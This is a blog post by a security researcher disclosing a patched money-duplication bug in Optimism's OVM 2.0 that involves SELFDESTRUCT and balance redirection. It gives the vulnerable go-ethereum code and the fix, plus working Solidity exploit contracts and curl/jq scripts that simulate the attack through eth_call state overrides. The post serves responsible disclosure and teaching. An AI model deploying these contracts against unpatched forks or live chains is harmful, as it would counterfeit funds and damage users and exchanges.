<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.saurik.com/optimism.html">Original</a>
    <h1>Attacking an Ethereum L2 with Unbridled Optimism</h1>
    
    <div id="readability-page-1" class="page"><div id="copy"><h3>The Summary</h3><p>On 2/2/2022, I reported a critical security issue to Optimism—an &#34;L2 scaling solution&#34; for Ethereum—that would allow an attacker to replicate money on any chain using their &#34;OVM 2.0&#34; fork of go-ethereum (which they call l2geth).</p><p>Quickly, Optimism—whose platform currently uses a centralized &#34;sequencer&#34;—moved to both fix this bug on their nodes and infrastructure, as well as arrange for downstream projects that used their codebase (Boba and Metis) to get patched.</p><p>This article provides the backstory of how and why I found this bug and goes into my usual &#34;extreme&#34; level of detail on how the bug works (something I haven&#39;t bothered to do in article form in a while: I&#39;ve mostly been just giving talks).</p><p>I will also be giving a talk at <a href="https://www.ethdenver.com/">ETHDenver</a> 2022, at 9:40am MST on February 18th, on this vulnerability. If you want to meet me while I&#39;m there, I should be available for much of the event. (I&#39;m also a &#34;mentor&#34;, but that seems to be flexible.)</p><div><p>This article slowly transitions from high-level background and discussion into deep, low-level technical detail; but, at the end, I return for some high-level thoughts on the ethics of security research and incentive alignment in the cryptocurrency industry. If you start thinking &#34;this is getting dry&#34;, try skipping ahead!</p></div><h3>My Background</h3><p>I am Jay Freeman, though I am mostly known online as &#34;saurik&#34; for my work on Cydia, an alternative to the App Store for jailbroken iOS devices. While I was a member of key jailbreak teams, I focused on everything &#34;after the hack&#34;.</p><p>In other past work, I developed multiple jailbreaks for Android (implementing mempodipper and Master Key), wrote the first decompiler for .NET (Exemplar, for my Anakrino GUI), and worked on nmap&#39;s programmatic scanning features.</p><p>I give a lot of talks at conferences, where I sometimes present &#34;Penn &amp; Teller&#34;-style exposés of exploit stacks. (This means my life for the past two years has been extremely reclusive and unhealthy, as I do not enjoy online conferences.)</p><p>I now am one of the remaining founders of <a href="https://www.orchid.com/">Orchid</a>, a project that builds a market for programmable bandwidth, along with <a href="https://twitter.com/deseventral">Steven Waterhouse</a> (a founding partner of Pantera Capital) and <a href="https://en.wikipedia.org/wiki/Brian_Fox_(computer_programmer)">Brian Fox</a> (developer of bash, readline, etc.).</p><h3>Orchid Nanopayments</h3><p>For Orchid, while I have no official/ratified title, I am &#34;in charge of technology&#34;. In particular (as relevant to this article), I have implemented all of Orchid&#39;s smart contracts, including the one used for &#34;nanopayments&#34;.</p><p>(While going into details of Orchid would be a digression, the reason Orchid cares about this is that users incrementally pay for access to the network with tiny payments, the fees for which would otherwise be too high.)</p><p>Our nanopayments integration—designed primarily by David Salamon, Justin Sheek, and myself, while leaning on the work done previously by <a href="https://news.ycombinator.com/item?id=27681940">Ronald L. Rivest at MIT and PepperCoin</a>—amortizes transaction fees for very small transfers.</p><p>While, over enough time, our system can amortize even very large transaction fees, there are side effects: the size of the payments goes up and the number of payments goes down, leading to a higher variance of expected vs. actual payment.</p><p>It is thereby interesting to Orchid when people create new, cheaper blockchain technology, as Orchid&#39;s payments infrastructure is not inherently tied to any single chain, and a lot of my work involves exploring and evaluating new options.</p><h3>Layer 2 Scaling</h3><p>Orchid is, in some sense, what one might call <a href="https://academy.binance.com/en/glossary/layer-2">a &#34;layer 2 scaling solution&#34;</a>: a payments system that runs as an ecosystem on top of another payments system. In our case, we implement what I have sometimes called a &#34;probabilistic rollup&#34;.</p><p>Our nanopayments system certainly isn&#39;t the only layer 2, and—being mostly off-chain with probabilistic settlement—isn&#39;t even a prototypical one. That said, it is common for people to quibble over what, exactly, another system can be &#34;considered&#34;.</p><p>The more commonly cited layer 2 solutions are systems such as <a href="https://www.optimism.io/">Optimism</a> or <a href="https://zksync.io/">zkSync</a>: each a prototypical example of an &#34;optimistic rollup&#34; and a &#34;zero-knowledge rollup&#34; (respectively). Vitalik (of Ethereum) wrote <a href="https://vitalik.ca/general/2021/01/05/rollup.html">an overview of rollups</a>.</p><p>Interestingly, the &#34;2&#34; in layer 2 is sometimes a bit arbitrary: layer 2 solutions that don&#39;t involve committing linear amounts of state to the underlying layer 1 can often compose or stack, allowing our nanopayments to run on another layer 2.</p><h3>Cross-Chain Bridges</h3><p>Many of the largest hacks we hear about in crypto happen to &#34;bridges&#34;, the contracts and protocols that allow users of one blockchain to work with assets on another blockchain. These are often needed even between an L2 and its L1.</p><p>As it is usually actually impossible to be <em>assured</em> of &#34;finality&#34;—the property that a transaction has once and truly committed and will never be reversed for any reason—in blockchain consensus systems, these bridges are fraught with inherent peril.</p><p>Often, at the end of the day, they end up even relying on trusted third-parties to authorize &#34;withdrawals&#34; (similar to banks, but before you try to claim &#34;omg they re-invented banks&#34;: the ability to permissionlessly create a bank is a feature).</p><p>The mechanism generally involves depositing money in a locked-up reserve on one side of the bridge and then printing an IOU on the other/remote side that can be traded and later redeemed to unlock some of the previously-deposited money from the reserve.</p><h3>All the Bridges Falling Down</h3><p>When bridges are attacked, generally someone managed to trick the smart contract that is holding the pile of money backing the IOUs to incorrectly release it, meaning IOUs on the other side of the bridge might not be redeemable.</p><p>On the same day that I reported the virtual machine bug discussed in this article to Optimism, <a href="https://wormholenetwork.com/">a cross-chain bridge called Wormhole</a> that connects Ethereum to Solana <a href="https://www.theverge.com/2022/2/3/22916111/wormhole-hack-github-error-325-million-theft-ethereum-solana">was hacked</a>, and someone walked away with ~$325 million worth of Ether.</p><p>Maybe surprisingly, <a href="https://jumpcrypto.com/">the company that owned Wormhole</a> immediately decided to take responsibility for the issue, and <a href="https://www.reuters.com/technology/crypto-network-wormhole-hit-with-possible-320-mln-hack-2022-02-03/">replaced all of the money in the reserves</a>. In the case of a previous hack on Poly Network, <a href="https://www.reuters.com/technology/white-hat-hacker-has-returned-nearly-all-600-million-crypto-tokens-taken-tuesday-2021-08-12/"> the hackers returned ~$610 million</a>.</p><p>It is my contention that hacks on bridges tend to be noticed quickly, as the people operating the bridge generally notice when &#34;their money&#34; (which they owe to other people, of course) disappears. Fixing the issue involves replacing the stolen capital.</p><h3>After the Hack</h3><p>Even when hackers do steal money from a bridge, the ramifications are limited as &#34;it&#39;s only money&#34;: if you steal the cash from a bank&#39;s vault, this is certainly a problem for them, and any &#34;bail out&#34; might be very costly for their backers...</p><p>...and yet, the bank should be thankful their record of accounts is safe: if they were no longer sure who owned what or which transfers were legitimate—with clients demanding conflicting corrections—the resulting dispute might never end.</p><p>(We can even here consider the idea of <a href="https://support.vauld.com/en/articles/4752104-security-at-vauld">&#34;insurance policies&#34; against crypto hacks</a>, particularly given that many of these bridges are semi-centralized and can &#34;mitigate&#34; hacks ahead of time, fixing issues before they result in loss.)</p><p>Such theft also tends to be maybe-surprisingly fruitless, with associated wallets being <a href="https://cointelegraph.com/news/over-10-000-blacklisted-btc-from-2016-bitfinex-hack-on-the-move">blacklisted by various exchanges</a> (which <a href="https://sethforprivacy.com/posts/fungibility-graveyard/">people have postulated</a> will cause the ecosystem problems in the future, making some Bitcoin <a href="https://news.ycombinator.com/item?id=30224637">akin to &#34;blood diamonds&#34;</a>).</p><h3>My Attack: Unbridled Optimism</h3><p>The bug presented here—which I dub &#34;Unbridled Optimism&#34;—can maybe be (crudely) modelled as a bug on the far side of a &#34;bridge&#34;, but is actually a bug in the virtual machine that executes smart contracts on Optimism (an aforementioned L2 rollup).</p><p>Exploiting this enables the attacker to have access to an effectively unbounded number of tokens (aka, the IOUs) on the far side of the bridge. It is my contention that this is more dangerous than merely tricking the reserves into allowing a withdrawl.</p><p>With the ability to sneakily print IOUs (known on Optimism as OETH) on the other side of the bridge, you still can try to (slowly) withdraw money from the reserves, but now it will look like a legitimate transfer, making it easier to go unnoticed.</p><p>(And, in case you believe that &#34;someone would notice if the total number of IOUs were different than the amount of money locked in the reserves&#34;, this bug actually was triggered 40 days ago—as I will point out later—and no alarm bells were raised.)</p><h3>Maximum Carnage</h3><p>Further, with your unbounded supply of IOUs, you could go to every decentralized exchange running on the L2 and mess with their economies, buying up vast quantities of other tokens while devaluing the chain&#39;s own currency.</p><p>Using your access to infinite capital, you could further manipulate on-chain pricing oracles to leverage for other attacks; and, until someone finally realizes your money is counterfeit, arbitragers will flock to the network to sell you their assets.</p><p>This makes this bug capable of economic griefing attacks, wherein once someone notices—even if it is a mere hour later!—it might be &#34;too late&#34; to unravel what is and what isn&#39;t a legitimate transaction, calling into question the entire ledger.</p><div><p>The next few sections involve a combination of lived and researched history of the Optimism project... which I entirely admit I might have gotten wrong somewhere. The goal here is to set up my interaction with the project and how I came to discover this bug, as I essentially write magazine-level content about software hacks ;P.</p></div><h3>George Hotz Cameo</h3><p>One of my favorite episodes of Optimism has <a href="https://twitter.com/jinglejamOP/status/1310718738417811459">a cameo by George Hotz</a>, the hacker who first unlocked an iPhone (and then continued to work on jailbreaks for years before moving on to work on AI and <a href="https://comma.ai/">aftermarket autonomous driving kits</a>).</p><p>An early premise of Optimism was to <a href="https://medium.com/@cpbuckland88/fraud-proofs-and-virtual-machines-2826a3412099">support &#34;non-interactive fraud proofs&#34;</a>, wherein if the L2 state committed to L1 were &#34;incorrect&#34;, someone could prove that to the smart contracts running on the system by using an (expensive) on-chain simulator.</p><p>The issue they had was that, for their model to work efficiently, Optimism couldn&#39;t build an interpreter, and instead <a href="https://medium.com/ethereum-optimism/ovm-deep-dive-a300d1085f52">needed a &#34;transpiler&#34;</a> that replaced <a href="https://web.archive.org/web/20210127062014/https://docs.optimism.io/protocol-specifications/ovm/transpiler">any instruction that accessed blockchain state</a> with function calls on system smart contracts.</p><p>&#34;geohot&#34; (as he is known to many of us) helped them by writing a modification to the compiler for Solidity—the language most people use to write smart contracts—that would allow people to rapidly generate OVM-compatible contract code.</p><h3>OVM 1.0 uses OVM_ETH ERC20</h3><p>The issue with this—and bear with me here, as this is relevant—is that this strategy was only compatible at the level of Solidity source code and couldn&#39;t run existing contracts already compiled for <a href="https://ethereum.org/en/developers/docs/evm/">the Ethereum Virtual Machine</a>.</p><p>Even as they worked to fix this for the first real release of their &#34;OVM&#34;, there was &#34;historical baggage&#34; that remained, both in the code and in the minds of the ecosystem that pushed the project down roads of further EVM incompatibility.</p><p>The biggest &#34;most glaring&#34; issue that I ran into while attempting to use Optimism at this time (late 2020) was that there was <a href="https://web.archive.org/web/20210127063556/https://docs.optimism.io/developer-documentation/erc20-tutorial/limitations">no native support for a &#34;gas token&#34;</a>: Ether stored on Optimism&#39;s L2 was instead represented by <a href="https://www.investopedia.com/news/what-erc20-and-what-does-it-mean-ethereum/">an ERC20 token</a>.</p><blockquote><div><p>We do not have built in native Ether support. For example, this means you will not be allowed to use BALANCE or SELFBALANCE (Note: you can use CALLVALUE, it will just always return 0).</p><p>All “ETH” on L2 will be an ERC20. Upon depositing ETH into our deposit contracts on L1, it will automatically be converted to ERC20 ETH on L2. If you wish to use ETH in your contract, instead just interact with it like you would with a normal ERC20 contract. This allows projects to not have to write their contracts to support both ERC20s and ETH, but rather just ERC20s (e.g. 0x, Uniswap).</p><p>We do have plans in the future to make our custom compiler automatically convert opcodes like BALANCE to ERC20ETH.balanceOf(addr) although this is currently not a priority until after mainnet. If this type of functionality is critical for your application, please let us know in Discord!</p></div></blockquote><p>I&#39;d actually read this, quite hopeful that this direction could be changed early on, and joined their Discord server on December 6th of 2020 in order to make the case that this incompatibility with the EVM semantics would lead to problems.</p><p>I ended up—as often happens with chat servers :/—in an argument with a random user who was acting extremely authoritative (to the point where I had started to model them as a key developer) that this was actually a <em>great</em> design decision.</p><p>Regardless, Orchid&#39;s multi-chain effort fundamentally requires that the same code be deployable on every network—so the list of supported chains can be &#34;permissionless&#34; and up to the user ecosystem—forcing me to pass on Optimism.</p><h3>EVM &#34;Equivalence&#34;</h3><p>Of course, a year later, it had become clear that not being compatible with existing smart contracts and developer tooling was, in fact, <em>a serious problem</em>; and, so, the Optimism project began work on <a href="https://medium.com/ethereum-optimism/introducing-evm-equivalence-5c2021deb306">what they called &#34;EVM Equivalence&#34;</a>.</p><p>This upgrade, to be named OVM 2.0, was of great interest to my work on Orchid, as it meant that the new multi-chain nanopayments platform I had been pushing us towards could finally be deployed. I thereby jumped back into Optimism.</p><p>When working with a new chain, the first thing I tend to do is run a quick unit test of functionality I either rely on or prefer (a test suite of sorts that has found bugs in numerous chains that I have reported over the past year).</p><p>Immediately, I ran into a confusing issue with Optimism: the account state—as cryptographically verifiable from the block &#34;state root&#34;—somehow was missing the account balance (which was, instead, always 0). I filed <a href="https://github.com/ethereum-optimism/optimism/issues/1947">a bug about this</a>.</p><h3>OVM_ETH Lives on in OVM 2.0</h3><p>The response to my bug report somewhat shocked me: it turned out that OVM 2.0 continued to store all of the balances for user accounts in the storage state of an ERC20 contract, and they were having <a href="https://github.com/ethereum-optimism/optimism/discussions/1444">an active discussion about <em>whether</em> to remove this</a>.</p><p>Regardless, this became a continual &#34;thorn in my side&#34; as I began working on another project of mine the last month or so: an extremely pedantic and heavily-indexed block explorer that introspects every state update of the entire EVM.</p><p>Between this, that <a href="https://github.com/ethereum-optimism/optimistic-specs/discussions/23">Optimism timestamps are backdated</a> (something <a href="https://github.com/ethereum-optimism/optimism/commit/57742a04df1894fcd264e358f2f3f37813e7658b">they did fix</a>) or even non-monotonic, and how they <a href="https://github.com/ethereum-optimism/optimism/issues/1975">keep rebooting their chain</a>, Optimism has caused me to spend a disproportionate amount of time feeling... &#34;pessimistic&#34; ;P.</p><p>(However, I will say that the developers of this project are actually quite pleasant to work with, and so I have at least had fun talking with them on Discord while trying to access older data and <a href="https://github.com/ethereum-optimism/optimism/issues/1976">filing bugs for high-level design issues</a>.)</p><h3>StateDB UsingOVM Redirection</h3><p>The way this &#34;store the native balances in an ERC20 token storage state&#34; is implemented in the codebase is as a set of patches to go-ethereum&#39;s StateDB, the code which maintains an in-memory buffer of pending/dirty account objects to flush to disk.</p><p>(The way Ethereum stores this state—and the <a href="https://medium.com/shyft-network-media/understanding-trie-databases-in-ethereum-9f03d2c3325d">state trie data structure</a> it uses to allow efficient cryptographic verification of cherry-picked data—is one of the more fascinating and useful parts of <a href="https://ethereumbuilders.gitbooks.io/guide/content/en/design_rationale.html">the protocol design</a>; here is <a href="https://medium.com/@eiki1212/ethereum-state-trie-architecture-explained-a30237009d4e">another reference</a>.)</p><p>The UsingOVM flag is set with a USING_OVM environment variable (with no corresponding command line flag, as far as I know; that you need to set this environment variable while initializing the genesis block took me too long to figure out ;P).</p><p>Operations on the StateDB that affect an account balance are then redirected from the underlying stateObject (which represents an individual, cached account) to storage state in the OVM_ETH contract. Below is the code for state.StateDB.SetBalance.</p><div><p><span>NOTE</span>: I heavily re-format and even somewhat &#34;editorialize&#34; code snippets to make them narrower, shorter, and less dense. If you go look at the actual code, don&#39;t be surprised when it doesn&#39;t look exactly the same as my presentation ;P.</p></div><blockquote><p><span>func (s *StateDB) SetBalance(
    addr common.Address, amount *big.Int
) {
    if rcfg.UsingOVM {
        key := GetOVMBalanceKey(addr)
        value := common.BigToHash(amount)
        s.SetState(dump.OvmEthAddress, key, value)
    } else {
        stateObject := s.GetOrNewStateObject(addr)
        if stateObject != nil {
            stateObject.SetBalance(amount)
        }
    }
}
</span></p></blockquote><p>Now, there&#39;s actually already something interesting going on: s.GetOrNewStateObject has an observable side effect; but, when UsingOVM, this doesn&#39;t get called. This means that an account might own native currency without having an account object!</p><p>The exact issue here is that contracts are able to ask for the hash of the code of other accounts (which is sometimes used to verify their trusted behaviors). If an account has no code, its code is &#34;&#34;, so its codehash is the hash of an empty buffer.</p><p>However, if you ask for the codehash of an address that isn&#39;t currently backed by an object in the state trie, the codehash you get back is null. This observable effect is an example of the subtle incompatibilities that Optimism keeps experiencing.</p><p>(If this were my project, I&#39;d definitely have dropped everything long ago—pre-OVM 2.0—to prioritize removing this set of patches by fixing GetOVMBalanceKey to store hash preimages, re-executing the chain, and then swapping out the state trie.)</p><h3>Why is it always SELFDESTRUCT?!</h3><p>One of the more &#34;problematic&#34; instructions in the Ethereum VM is SELFDESTRUCT, which goes back to the original design. (For clarity: this instruction used to be called SUICIDE, but the <em>code</em>—which we will be reading—was never renamed.)</p><p>This instruction allows a contract to destroy itself, removing its account object. The primary benefit of this instruction is that it allows for potentially large amounts of &#34;obsolete&#34; state to be cleaned up quickly from the blockchain&#39;s active set.</p><p>On the other hand, what makes this instruction &#34;problematic&#34; (besides <a href="https://eips.ethereum.org/EIPS/eip-6">its triggering name</a>) is that it allows for potentially LARGE amounts of state to be cleaned up VERY QUICKLY, requiring the VM to do an arbitrary amount of work, atomically.</p><p>This instruction has further been known to continually cause corner cases in new EVM features, and so has often been threatened with <a href="https://hackmd.io/@vbuterin/selfdestruct">some form of removal</a> (such as <a href="https://eips.ethereum.org/EIPS/eip-3670">banning it in new contracts</a> or <a href="https://github.com/ethereum/EIPs/pull/4758">removing most of its functionality</a>).</p><h3>How SELFDESTRUCT Works</h3><p>When a contract hits the SELFDESTRUCT instruction, it designates a &#34;beneficiary&#34; to receive any funds it still owns. The implementation of this opcode in go-ethereum&#39;s EVM adds the balance to the beneficiary and then calls StateDB.Suicide.</p><blockquote><p><span>func opSuicide(
    pc *uint64, interpreter *EVMInterpreter,
    contract *Contract, memory *Memory, stack *Stack
) ([]byte, error) {
    state := interpreter.evm.StateDB

    beneficiary := common.BigToAddress(stack.pop())
    balance := state.GetBalance(contract.Address())
    state.AddBalance(beneficiary, balance)

    state.Suicide(contract.Address())

    return nil, nil
}
</span></p></blockquote><p>The implementation of StateDB.Suicide then clears the balance of the account back to 0. Frustratingly, it does this using neither the stateObject&#39;s setBalance setter nor to the shared common.Big0 constant, making this a bespoke piece of logic.</p><blockquote><p><span>func (s *StateDB) Suicide(addr common.Address) bool {
    stateObject := s.getStateObject(addr)
    if stateObject == nil { return false }

    stateObject.markSuicided()

    stateObject.data.Balance = new(big.Int)
    // aka stateObject.setBalance(common.Big0)

    return true
}
</span></p></blockquote><p>StateDB.Suicide, in turn, calls stateObject.markSuicided, which does nothing other than set a boolean value on the object to true. Importantly, this means that the contract at this point STILL EXISTS and continues to have the code it previously had!</p><blockquote><p><span>func (s *stateObject) markSuicided() {
    s.suicided = true
}
</span></p></blockquote><h3>Pending Deletion</h3><p>This begs the question: how does the object ever actually get destroyed? The answer is that this is postponed to the end of the transaction, when StateDB.Finalise is called and all of the suicided dirty account objects are marked deleted.</p><blockquote><p><span>func (s *StateDB) Finalise() {
    for addr := range s.journal.dirties {
        obj, exist := s.stateObjects[addr]
        if !exist { continue }

        if obj.suicided || obj.empty() {
            obj.deleted = true
        } else {
            obj.finalise()
        }
    }

    s.clearJournalAndRefund()
}
</span></p></blockquote><p>(As a further optimization, the actual account object isn&#39;t truly deleted until the next time the state root hash needs to be calculated, as all of the changes to the merkle trie can then be made and committed at once. This isn&#39;t relevant, though.)</p><blockquote><p><span>func (s *StateDB) IntermediateRoot() common.Hash {
    s.Finalise()

    for addr := range s.stateObjectsPending {
        obj := s.stateObjects[addr]
        if obj.deleted {
            s.deleteStateObject(obj)
        } else {
            obj.updateRoot(s.db)
            s.updateStateObject(obj)
        }
    }

    return s.trie.Hash()
}
</span></p></blockquote><h3>The Actual Bug</h3><p>By this point, we actually &#34;passed by&#34; the critical bug... did you catch it? ;P The code for Suicide is still directly modifying the stateObject&#39;s data.Balance field instead of checking UsingOVM and redirecting that modification to OVM_ETH.</p><p><span>This means that, when a contract self-destructs, its balance is BOTH given to the beneficiary AND ALSO KEPT. If the contract had 10 ETH, 10 ETH are CREATED from thin bits and handed to the beneficiary.</span></p><p>When Optimism fixed this bug—as part of <a href="https://github.com/ethereum-optimism/optimism/pull/2146">PR #2146</a> (which slightly hid this update in a pile of other updates to give time for unknown forks to update their code)—they added the following logic to opSuicide (notably, not StateDB.Suicide).</p><blockquote><p><span>if rcfg.UsingOVM &amp;&amp; interpreter.evm.chainConfig
    .IsSelfDestructInflation(interpreter.evm.BlockNumber)
{
    state.SubBalance(contract.Address(), balance)
}
</span></p></blockquote><p>As far as I can tell, the reason they needed to put this code in opSuicide—which separates it from the other logic that directly clears the balance field as well as all of the other UsingOVM overrides—is so they can get access to the chainConfig.</p><p>This is important, because the code still needs to implement the wrong behavior to allow it to synchronize all of the historical state, some of which actually tickles this bug (without exploiting it). They decided block 3135900 would be the cutoff.</p><blockquote><p><span>// OpMainnetSelfDestructForkNum is the height at which the
// suicide inflation bug hardfork activates on OP mainnet.
OpMainnetSelfDestructForkNum = big.NewInt(3135900)
</span></p></blockquote><h3>Was this Exploited?</h3><p>One of the questions we often want to answer is &#34;has anyone else already pulled off an exploit using this bug?&#34;. To answer this, I instrumented the code for the OVM 2.0 to log any time a transaction destroyed a contract with a balance.</p><p>As SELFDESTRUCT is already a rare opcode, and this is even then a subset of all uses of SELFDESTRUCT—and further, as OVM 2.0 was only released three months ago—there was only a single user who had ever tried this: <a href="https://optimistic.etherscan.io/address/0x3d080421c9dd5fb387d6e3124f7e1c241ade9568">on Christmas Eve (2021)</a>.</p><p>In those transactions (as seen on the Optimism block explorer hosted by Etherscan) we see a user creating and destroying three contracts. The first two times, the contract&#39;s beneficiary is the 0x0 address, while the third time it is the user themself.</p><p>It frankly felt like someone had noticed the bug—seeing that Etherscan left the balance in place after the contract was destroyed—and even played with it a bit (to see if this was a behavior of 0x0)... but hadn&#39;t realized it was exploitable.</p><p>I actually managed to track down this user (!!) and it turns out they work for Etherscan ;P. It just goes to show that sometimes even people who are staring directly at a bug don&#39;t always see the indirect security implications.</p><div><p>I have not, myself, had time to verify that this was never triggered on the two known-to-me forks of Optimism: Boba and Metis. I feel like someone else might have checked by now and told me, and I also feel it is probably somewhat unlikely (given the lack of usage on Optimism), but I can&#39;t say for sure one way or the other at this time.</p></div><h3>Concrete Exploit</h3><p>Which brings us to the fun part: a hands on exploration of exploiting this bug. To do this, we need to write a contract (in Solidity) that we can deploy/fund and on which we can call SELFDESTRUCT, replicating the money it is holding.</p><p>As the contract continues to exist until the end of the transaction, and we want to replicate money as fast as possible (by compounding our earnings), we set the contract itself as the beneficiary. This way, each call to destroy doubles its funds.</p><p>To allow the contract to be funded in the first place, we have to add a payable constructor. Finally, we add a method that allows us to get the money back out of the contract (I originally used selfdestruct, but transfer is cleaner).</p><blockquote><p><span>pragma solidity 0.7.6;

contract Exploit {
    constructor() payable {}

    function destroy() public {
        selfdestruct(payable(address(this)));
    }

    function take() public {
        msg.sender.transfer(address(this).balance);
    }
}
</span></p></blockquote><p>To drive this attack, we need another contract which creates an instance of this contract, calls destroy in a loop, and then calls take. I decided to put this logic in the constructor of the contract, so it could be created and executed in one transaction.</p><blockquote><p><span>contract Attack {
    constructor(uint count) payable {
        Exploit exploit = new Exploit{value: msg.value}();
        for (; count != 0; --count)
            exploit.destroy();
        exploit.take();
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {}
}
</span></p></blockquote><p>As this contract will be receiving funds from the Exploit contract it instantiates, it needs a payable receive() implementation (as otherwise the contract will reject any attempt to give it money using transfer; notably, selfdestruct would bypass this!).</p><h3>Safe/Easy Testing</h3><p>While one way to test this exploit would be to run it, that not only might cause problems later on guaranteeing the state is still legitimate, but it could potentially tip off other people watching the blockchain looking to steal our exploit.</p><p>That might sound far-fetched, but it is <a href="https://www.paradigm.xyz/2020/08/ethereum-is-a-dark-forest">actually quite common</a> and is heavily automated: in this case, our exploit is so &#34;plug-and-play&#34; that if someone merely simulated running it themselves they would become the beneficiary.</p><p>While I will leave attempts to build more obfuscated exploits as &#34;an exercise to the reader&#34;, if nothing else you need a way to test the behavior of your exploit while developing it, and so we need an easy way to simulate running instructions.</p><p>At this point someone might suggest an off-the-shelf test-driver—such as Ganache—but it wouldn&#39;t have this bug. We could give it the bug, but that&#39;s work. We could run our own local fork of Optimism, complete with sequencer, but that&#39;s also work.</p><p>Instead, we want a way to use a &#34;normal&#34; Optimism full node—preferably one we run ourselves (as we&#39;re talking about a very serious exploit), though for our exploration here the public endpoints will work just fine!—to run our exploit.</p><h3>eth_call State Overrides</h3><p>The solution is the JSON/RPC method eth_call. Now, I get it: &#34;eth_call is obvious; I know about eth_call&#34;. (In case you don&#39;t: eth_call is a method exposed by Ethereum nodes that allows you to speculatively run exported Solidity functions.)</p><p>However, it isn&#39;t actually so obvious: if you read <a href="https://eth.wiki/json-rpc/API#eth_call">the documentation for eth_call</a>, it is only going to let us run code that is already deployed to the blockchain, which we really want to avoid at all costs, lest someone notice our exploit.</p><p>The trick is that go-ethereum—the most commonly used EVM implementation—additionally <a href="https://geth.ethereum.org/docs/rpc/ns-eth#eth_call">supports &#34;state overrides&#34; on eth_call</a> that let us pose hypothetical execution environments by changing the code or balance of an account.</p><p>Our strategy will thereby be to develop a tiny contract that scripts all of the behaviors we need (instantiating and funding Attack) and then returns any information we need to see if our code worked (in this case, our final balance).</p><blockquote><p><span>contract Test {
    function test(uint256 count) public payable returns (uint256) {
        new Attack{value: msg.value}(count);
        return address(this).balance;
    }
}
</span></p></blockquote><h3>JSON/RPC via curl</h3><p>To make this a &#34;hands on&#34; exercise, I&#39;m going to walk you through compiling and executing this contract using nothing but curl, jq, xxd, and (for the Solidity compiler) docker (though you can alternatively install solc on your system).</p><div><p><span>NOTE</span>: Optimism&#39;s public RPC server is (apparently) being run by <a href="https://www.quicknode.com/">QuickNode</a>, and they only are set up to allow a trivial number of historical queries; so, when doing calls on old blocks, you might get a null result back with the error &#34;Archive Requests/month limit reached - Please consider upgrading at quicknode.com&#34;; if this happens, you will (sadly) have to run your own full Optimism node to see the result.</p></div><p>First we define an rpc variable to contain the URL of our Optimism full node. Then, we define an rpc function that will take a JSON object via stdin, add to it the JSON/RPC protocol fields using jq, and then post it to the RPC server using curl.</p><blockquote><p><span>rpc=https://mainnet.optimism.io/
function rpc() { jq &#39;.+{jsonrpc:&#34;2.0&#34;,id:1}&#39; |
    curl -H &#39;Content-Type: application/json&#39; \
    -s &#34;$rpc&#34; --data-binary @-; }
</span></p></blockquote><p>Next, we will compile the contract (named attack.sol); in the build folder we will have three .bin files, one for each of Exploit, Attack, and Test. These bin files <a href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/">don&#39;t actually represent the code for the contract</a>: they are the code for the constructor.</p><blockquote><p><span># don&#39;t do this if you installed solc
alias solc=&#39;docker run -v &#34;$PWD&#34;:/mnt \
    -w /mnt ethereum/solc:0.7.6&#39;

solc -o build attack.sol --bin --overwrite
</span></p></blockquote><p>The constructor returns the code for the contract itself, so we are going to override the state of a random account to make its code the code of this constructor (this would never actually happen) and then eth_call it to get its return value.</p><blockquote><p><span>rnd=0x$(head -c 20 /dev/urandom | xxd -ps)
tst=$(echo &#39;{&#34;method&#34;:&#34;eth_call&#34;,&#34;params&#34;:[
    {&#34;to&#34;:&#34;&#39;&#34;$rnd&#34;&#39;&#34;},&#34;latest&#34;,{&#34;&#39;&#34;$rnd&#34;&#39;&#34;:
        {&#34;code&#34;:&#34;0x&#39;&#34;$(cat build/Test.bin)&#34;&#39;&#34;}
    }]}&#39; | rpc | jq -r .result)
</span></p></blockquote><h3>Testing the Fix</h3><p>Now that we have the code for the Test contract itself, we can override the code on our random address to <em>that</em> and then eth_call the test() method. We will also create a second address to be the caller, and override its state to own money.</p><blockquote><p><span>frm=0x$(head -c 20 /dev/urandom | xxd -ps)
function tst() { set -e; blk=$1; shift 1;
    echo &#39;{&#34;method&#34;:&#34;eth_call&#34;,&#34;params&#34;:[{
        &#34;data&#34;:&#34;0x29e99f07&#39;&#34;$(printf &#39;%064x&#39; 1)&#34;&#39;&#34;,
        &#34;from&#34;:&#34;&#39;&#34;$frm&#34;&#39;&#34;,&#34;value&#34;:&#34;0x1&#34;,
        &#34;to&#34;:&#34;&#39;&#34;$rnd&#34;&#39;&#34;},&#34;&#39;&#34;$blk&#34;&#39;&#34;,{
            &#34;&#39;&#34;$frm&#34;&#39;&#34;:{&#34;balance&#34;:&#34;0x1&#34;},
            &#34;&#39;&#34;$rnd&#34;&#39;&#34;:{&#34;code&#34;:&#34;&#39;&#34;$tst&#34;&#39;&#34;}
        }]}&#39; | rpc | jq -r .result; }
</span></p></blockquote><p>If you take the time to pull apart all of the shell quoting (sorry), you will note that the &#34;data&#34; we send to the contract is 0x29e99f07. This is the first 32-bits of the keccak256 hash of &#34;test(uint256)&#34;, which serves as the message selector for that function.</p><p>We can now run the exploit. The tst function I defined takes an argument blk (that must be in hex) which is the block number &#34;at which&#34; to run our code; this allows us to try running our code before and after OpMainnetSelfDestructForkNum.</p><blockquote><p><span>$ echo $(($(tst $(printf 0x%x 3135900))))
1
$ echo $(($(tst $(printf 0x%x 3135899))))
2
</span></p></blockquote><p>When running this on a block after (or including) 3135900, we will only have the 1 token we started with (sent as the value parameter in tst). However, when running on blocks before 3135900, we get the result 2 (as Test has Attack double once).</p><h3>Yet Another Incompatibility</h3><p>At this point, you might wonder what happens if we try this on other EVM-compatible blockchains, such as Ethereum or Avalanche. We merely need to change the rpc variable and re-run tst. The result we get is... 0. Not 2 (of course), <em>but also not 1</em>.</p><blockquote><p><span>$ rpc=https://cloudflare-eth.com/
$ echo $(($(tst latest)))
0
